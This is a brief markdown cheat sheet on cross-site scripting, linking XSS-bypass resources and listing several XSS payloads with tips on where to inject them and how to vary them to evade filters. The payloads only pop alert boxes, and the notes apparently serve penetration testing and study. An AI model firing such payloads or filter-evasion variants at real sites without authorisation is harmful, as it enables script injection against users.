# secure

## XSS

- https://github.com/s0md3v/MyPapers/tree/master/Bypassing-XSS-detection-mechanisms
- https://brutelogic.com.br/blog/xss-cheat-sheet/
  - ```
    "><img src onerror=alert(1)>
    "autofocus onfocus=alert(1)//
    </script><script>alert(1)</script>
    '-alert(1)-'
    \'-alert(1)//
    javascript:alert(1)
    ```
  - Try it on:
    - URL query, fragment & path;
    - all input fields.
  - Try to change
    - " for ' and vice versa according to where injection lands
    - alert(1) for (confirm)(1) or confirm\`1\`
    - // for `<!--`
    - spaces for / or %0A, %0C or %0D.
